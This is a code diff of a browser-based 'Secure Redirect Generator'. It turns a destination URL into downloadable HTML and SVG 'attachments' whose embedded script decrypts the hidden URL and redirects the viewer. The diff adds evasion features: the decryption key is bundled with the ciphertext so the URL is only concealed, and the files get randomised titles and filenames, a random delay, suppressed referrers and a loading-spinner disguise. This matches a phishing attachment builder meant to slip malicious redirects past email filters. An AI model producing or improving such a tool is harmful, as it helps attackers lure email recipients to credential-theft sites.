@@ -2,115 +2,142 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Encrypted Link Generator</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Secure Redirect Generator</title>
 <style>
-html, body { height: 100%; margin: 0; font-family: Arial, sans-serif; background: #f8f9fa; color: #111; }
-.section { border: 1px solid #e0e0e0; padding: 14px; border-radius: 8px; margin: 18px auto; max-width: 960px; background: #fff; }
-input[type="text"] { width: 70%; padding: 8px; border: 1px solid #ccc; border-radius: 4px; }
-button { padding: 8px 12px; border-radius: 6px; border: 0; background: #0366d6; color: #fff; cursor: pointer; margin: 4px; }
-.sample { word-break: break-all; color: #0366d6; text-decoration: none; }
+html,body{margin:0;font-family:Arial,sans-serif;background:#f8f9fa;color:#111;}
+.section{border:1px solid #e0e0e0;padding:14px;border-radius:8px;margin:18px auto;max-width:960px;background:#fff;}
+input[type=text]{width:70%;padding:8px;border:1px solid #ccc;border-radius:4px;}
+button{padding:8px 12px;border-radius:6px;border:0;background:#0366d6;color:#fff;cursor:pointer;margin:4px;}
+.sample{word-break:break-all;color:#0366d6;text-decoration:none;}
+.spinner{width:40px;height:40px;border:5px solid #ccc;border-top-color:#0366d6;border-radius:50%;animation:spin 1s linear infinite;margin:100px auto;opacity:1;transition: opacity 1s ease-in-out;}
+@keyframes spin{to{transform:rotate(360deg);}}
+.hidden{opacity:0;}
 </style>
-<script src="https://cdn.jsdelivr.net/npm/qrcode/build/qrcode.min.js"></script>
 </head>
 <body>
 <div class="section">
-<h2>Encrypted Link Generator</h2>
-<input id="targetInput" type="text" placeholder="Enter destination URL e.g. https://example.com"/>
-<button id="generateBtn">Generate</button>
+<h2>Secure Encrypted Redirect Generator</h2>
+<input id="targetInput" type="text" placeholder="Enter destination URL e.g. https://example.com">
+<button id="generateBtn">Generate Secure Attachments</button>
 <div id="generated" style="margin-top:12px;"></div>
 </div>
 
 <script>
-const BASE_URL = window.location.origin + window.location.pathname;
-
-function uuid() {
-    return crypto.randomUUID ? crypto.randomUUID() : "id-" + Math.random().toString(36).slice(2,12);
+// --- Random title generator ---
+function randomTitle(){
+  const words=["Horizon","Echo","Pulse","Aurora","Zenith","Solstice","Drift","Vertex","Halo","Nimbus","Voyage","Cascade"];
+  return words[Math.floor(Math.random()*words.length)]+" "+Math.floor(Math.random()*1000);
 }
 
-function arrayBufferToBase64(buffer) {
-    let binary = "";
-    const bytes = new Uint8Array(buffer);
-    for (let i = 0; i < bytes.byteLength; i++) binary += String.fromCharCode(bytes[i]);
-    return btoa(binary);
+// --- Utilities ---
+function uuid(){return crypto.randomUUID?crypto.randomUUID():"id-"+Math.random().toString(36).slice(2,12);}
+function bufToB64(b){return btoa(String.fromCharCode(...new Uint8Array(b)));}
+function b64ToBuf(b64){const bin=atob(b64);const arr=new Uint8Array(bin.length);for(let i=0;i<bin.length;i++)arr[i]=bin.charCodeAt(i);return arr.buffer;}
+async function genKey(){return crypto.subtle.generateKey({name:"AES-GCM",length:256},true,["encrypt","decrypt"]);}
+
+// --- Encrypt payload ---
+async function encryptPayload(obj){
+  const key=await genKey();
+  const iv=crypto.getRandomValues(new Uint8Array(12));
+  const data=new TextEncoder().encode(JSON.stringify(obj));
+  const encrypted=await crypto.subtle.encrypt({name:"AES-GCM",iv},key,data);
+  const rawKey=await crypto.subtle.exportKey("raw",key);
+  return {c:bufToB64(encrypted),iv:bufToB64(iv),k:bufToB64(rawKey)};
 }
 
-async function generateAESKey() {
-    return crypto.subtle.generateKey({name:"AES-GCM", length:256}, true, ["encrypt","decrypt"]);
-}
-
-async function encryptPayload(payload) {
-    const key = await generateAESKey();
-    const iv = crypto.getRandomValues(new Uint8Array(12));
-    const encoded = new TextEncoder().encode(JSON.stringify(payload));
-    const encrypted = await crypto.subtle.encrypt({name:"AES-GCM", iv}, key, encoded);
-    const rawKey = await crypto.subtle.exportKey("raw", key);
-    return arrayBufferToBase64(encrypted) + "." + arrayBufferToBase64(iv) + "." + arrayBufferToBase64(rawKey);
-}
-
-function generateHTML(encData) {
-    return `
-<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Redirecting...</title></head>
-<body><script>
+// --- HTML redirect with random delay + no referrer ---
+function makeHTML(encData){
+  const t=randomTitle();
+  return `<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>${t}</title>
+<meta name="referrer" content="no-referrer">
+<style>
+body{margin:0;display:flex;align-items:center;justify-content:center;height:100vh;background:#fff;}
+.spinner{width:40px;height:40px;border:5px solid #ccc;border-top-color:#0366d6;border-radius:50%;animation:spin 1s linear infinite;}
+@keyframes spin{to{transform:rotate(360deg);}}
+</style>
+</head>
+<body>
+<div class="spinner"></div>
+<script>
 (async()=>{
 const str="${encData.replace(/"/g,'\\"')}";
-function base64ToArrayBuffer(b){const bin=atob(b);const bytes=new Uint8Array(bin.length);for(let i=0;i<bin.length;i++)bytes[i]=bin.charCodeAt(i);return bytes.buffer;}
-async function decryptPayload(str){try{const [e,iv,k]=str.split(".");const keybuf=base64ToArrayBuffer(k);const encrypted=base64ToArrayBuffer(e);const ivbuf=base64ToArrayBuffer(iv);const key=await crypto.subtle.importKey("raw",keybuf,"AES-GCM",true,["decrypt"]);const decrypted=await crypto.subtle.decrypt({name:"AES-GCM",iv:ivbuf},key,encrypted);return JSON.parse(new TextDecoder().decode(decrypted));}catch(e){return null;}}
-const payload=await decryptPayload(str);if(payload && payload.u) window.location.href=payload.u;
+function b64ToBuf(b){const bin=atob(b);const arr=new Uint8Array(bin.length);for(let i=0;i<bin.length;i++)arr[i]=bin.charCodeAt(i);return arr.buffer;}
+async function decryptPayload(s){
+ try{
+   const [e,iv,k]=s.split(".");
+   const key=await crypto.subtle.importKey("raw",b64ToBuf(k),"AES-GCM",false,["decrypt"]);
+   const dec=await crypto.subtle.decrypt({name:"AES-GCM",iv:b64ToBuf(iv)},key,b64ToBuf(e));
+   return JSON.parse(new TextDecoder().decode(dec));
+ }catch{return null;}
+}
+const p=await decryptPayload(str);
+if(p&&p.u){const d=1500+Math.random()*1500;setTimeout(()=>{document.querySelector('.spinner').classList.add('hidden');location.href=p.u;},d);}
+else{document.body.innerHTML="<h3>Invalid or expired link</h3>";}
 })();
-<\/script></body></html>`;
+<\/script>
+</body></html>`;
 }
 
-function generateSVG(encData) {
-    return `
-<svg xmlns="http://www.w3.org/2000/svg" width="200" height="50">
-<rect width="100%" height="100%" fill="#eef"/>
-<text x="10" y="30" font-size="14">Encrypted Link</text>
+// --- SVG redirect with random delay + no referrer ---
+function makeSVG(encData){
+  const t=randomTitle();
+  return `<svg xmlns="http://www.w3.org/2000/svg" width="200" height="100">
+<title>${t}</title>
+<rect width="100%" height="100%" fill="#f8f9fa"/>
+<!-- Centered spinner -->
+<circle cx="100" cy="50" r="20" stroke="#ccc" stroke-width="4" fill="none"/>
+<circle cx="100" cy="50" r="20" stroke="#0366d6" stroke-width="4" fill="none" stroke-dasharray="31.4 31.4">
+  <animateTransform attributeName="transform" type="rotate" from="0 100 50" to="360 100 50" dur="1s" repeatCount="indefinite"/>
+</circle>
 <script type="application/ecmascript"><![CDATA[
 (async()=>{
 const str="${encData.replace(/"/g,'\\"')}";
-function base64ToArrayBuffer(b){const bin=atob(b);const bytes=new Uint8Array(bin.length);for(let i=0;i<bin.length;i++)bytes[i]=bin.charCodeAt(i);return bytes.buffer;}
-async function decryptPayload(str){try{const [e,iv,k]=str.split(".");const keybuf=base64ToArrayBuffer(k);const encrypted=base64ToArrayBuffer(e);const ivbuf=base64ToArrayBuffer(iv);const key=await crypto.subtle.importKey("raw",keybuf,"AES-GCM",true,["decrypt"]);const decrypted=await crypto.subtle.decrypt({name:"AES-GCM",iv:ivbuf},key,encrypted);return JSON.parse(new TextDecoder().decode(decrypted));}catch(e){return null;}}
-const payload=await decryptPayload(str);if(payload && payload.u) window.location.href=payload.u;
+function b64ToBuf(b){const bin=atob(b);const arr=new Uint8Array(bin.length);for(let i=0;i<bin.length;i++)arr[i]=bin.charCodeAt(i);return arr.buffer;}
+async function decryptPayload(s){
+ try{
+   const [e,iv,k]=s.split(".");
+   const key=await crypto.subtle.importKey("raw",b64ToBuf(k),"AES-GCM",false,["decrypt"]);
+   const dec=await crypto.subtle.decrypt({name:"AES-GCM",iv:b64ToBuf(iv)},key,b64ToBuf(e));
+   return JSON.parse(new TextDecoder().decode(dec));
+ }catch{return null;}
+}
+const p=await decryptPayload(str);
+if(p&&p.u){const d=1500+Math.random()*1500;setTimeout(()=>{document.querySelector('.spinner').classList.add('hidden');location.href=p.u;},d);}
 })();
 ]]><\/script>
 </svg>`;
 }
 
-function downloadFile(filename, content, type) {
-    const blob = new Blob([content], {type});
-    const a = document.createElement("a");
-    a.href = URL.createObjectURL(blob);
-    a.download = filename;
-    a.click();
+// --- Download helper ---
+function download(name,content,type){
+  const blob=new Blob([content],{type});
+  const a=document.createElement("a");
+  a.href=URL.createObjectURL(blob);
+  a.download=name;
+  a.click();
 }
 
-async function generateQRCodeSVG(link) {
-    return await QRCode.toString(link, { type:"svg", width:128 });
-}
-
-document.getElementById("generateBtn").addEventListener("click", async () => {
-    const dest = document.getElementById("targetInput").value.trim();
-    if (!dest) { alert("Enter destination URL."); return; }
-    const payload = { u: dest, r: uuid(), t: Date.now() };
-    const encData = await encryptPayload(payload);
-    const finalUrl = BASE_URL + "?w=" + encodeURIComponent(encData);
-
-    const html = generateHTML(encData);
-    const svg  = generateSVG(encData);
-    const qr   = await generateQRCodeSVG(finalUrl);
-
-    const out = document.getElementById("generated");
-    out.innerHTML = `
-        <p>Final link:<br><a class="sample" href="${finalUrl}" target="_blank">${finalUrl}</a></p>
-        <button id="dl-html">Download HTML</button>
-        <button id="dl-svg">Download SVG</button>
-        <button id="dl-qr">Download QR</button>
-    `;
-
-    document.getElementById("dl-html").onclick = () => downloadFile(uuid()+".html", html, "text/html");
-    document.getElementById("dl-svg").onclick  = () => downloadFile(uuid()+".svg", svg, "image/svg+xml");
-    document.getElementById("dl-qr").onclick   = () => downloadFile(uuid()+".svg", qr, "image/svg+xml");
+// --- Generator button ---
+document.getElementById("generateBtn").addEventListener("click",async()=>{
+  const dest=document.getElementById("targetInput").value.trim();
+  if(!dest){alert("Enter a destination URL first");return;}
+  const payload={u:dest,r:uuid(),t:Date.now()};
+  const enc=await encryptPayload(payload);
+  const joined=`${enc.c}.${enc.iv}.${enc.k}`;
+  const html=makeHTML(joined);
+  const svg=makeSVG(joined);
+  const out=document.getElementById("generated");
+  out.innerHTML=`
+    <p>Attachments generated successfully.</p>
+    <button id="dlhtml">Download HTML</button>
+    <button id="dlsvg">Download SVG</button>`;
+  document.getElementById("dlhtml").onclick=()=>download(uuid()+".html",html,"text/html");
+  document.getElementById("dlsvg").onclick=()=>download(uuid()+".svg",svg,"image/svg+xml");
 });
 </script>
 </body>
